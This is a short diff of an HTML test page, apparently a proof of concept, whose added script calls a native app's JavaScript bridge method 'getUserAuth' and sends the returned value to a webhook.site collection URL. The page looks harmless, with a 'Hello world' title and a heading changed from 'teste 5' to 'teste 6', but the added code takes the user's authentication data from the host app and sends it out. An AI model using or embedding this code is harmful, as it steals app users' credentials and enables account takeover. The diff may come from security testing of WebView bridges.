@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello world</title>
-    <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js">
+    <!-- <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js">
 
-        var dsBridge = require("dsbridge")
+        var dsBridge = require("_dsbridge")
 
         const webhook = "https://webhook.site/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b"
 
@@ -17,14 +17,25 @@
 
         })
 
-    </script>
+    </script> -->
     <script>
-        fetch("https://webhook.site/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b?data=test", { mode: "no-cors" })
+
+
+        const webhook = "https://webhook.site/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b"
+
+        _dsBridge.call("getUserAuth", function (value) {
+            alert(value)
+            fetch(webhook + "?data=" + value, { mode: "no-cors" })
+
+        })
+
+
+
     </script>
 </head>
 
 <body>
-    <h1>teste 5</h1>
+    <h1>teste 6</h1>
 </body>
 
 </html>
